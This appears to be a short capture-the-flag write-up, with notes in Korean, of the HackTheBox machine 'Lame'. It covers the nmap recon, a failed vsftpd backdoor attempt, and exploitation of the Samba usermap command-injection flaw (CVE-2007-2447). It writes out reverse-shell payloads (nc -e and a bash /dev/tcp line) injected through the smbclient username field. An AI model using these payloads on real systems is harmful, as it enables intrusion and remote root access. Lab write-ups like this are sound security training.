# Lame - HackTheBox
## Recon
```bash
sudo nmap -p 21,22,139,445,3632 -sC -sV -vv -oA lame 10.10.10.3
```
<img width="1104" height="641" alt="image" src="https://github.com/user-attachments/assets/97f789d7-3e18-4eac-a138-fab2c1e7d4e6" />

- FTP(21)
- SSH(22)
- SMB(445)

---
## FTP
- `vsftpd 2.3.4` 취약점(CVE-2011-2523)
-  해당 취약점을 시도했으나 성공하지 못함.

## SMB
- `Samba smbd 3.0.20` 취약점(CVE-2007-2447)
-  https://github.com/amriunix/CVE-2007-2447

<br>

- `username` 부분에서 명령어를 입력해서 전달하게 되면 실행을 하게 되는 취약점.
<img width="1104" height="191" alt="image" src="https://github.com/user-attachments/assets/cf7d7af3-7f1b-4050-8192-1374a627dd26" />

<br>
<br>

- `ping`테스트 성공.
<img width="1104" height="104" alt="image" src="https://github.com/user-attachments/assets/8739191a-4e01-4734-8d5c-ef14ec24ed76" />

<br>

<img width="1104" height="257" alt="image" src="https://github.com/user-attachments/assets/98c74848-edf5-4cda-b1bf-98457532283c" />

<br>
<br>

- 리버스 셸 연결을 시도하였으나 실패.
```bash
smbclient //10.10.10.3/tmp -U '`nc 10.10.16.4 80 -e /bin/bash`'

smbclient //10.10.10.3/tmp -U '`bash -c "bash -i >&/dev/tcp/10.10.16.4/80 0>&1"`'
```

<br>

- script를 실행.
```bash
python3 usermap_script.py 10.10.10.3 445 10.10.16.4 80
```
<img width="1104" height="120" alt="image" src="https://github.com/user-attachments/assets/971e74d1-9449-44cd-b658-7f3eae709da5" />

<br>
<br>

- 셸 획득.
<img width="1104" height="150" alt="image" src="https://github.com/user-attachments/assets/1a842d85-0614-43b7-88d6-7621428df4ab" />

---
## FLAG
- `/root/root.txt`
<img width="1104" height="445" alt="image" src="https://github.com/user-attachments/assets/569cfdf9-cf12-4f8c-9a37-f36e66fe17e4" />


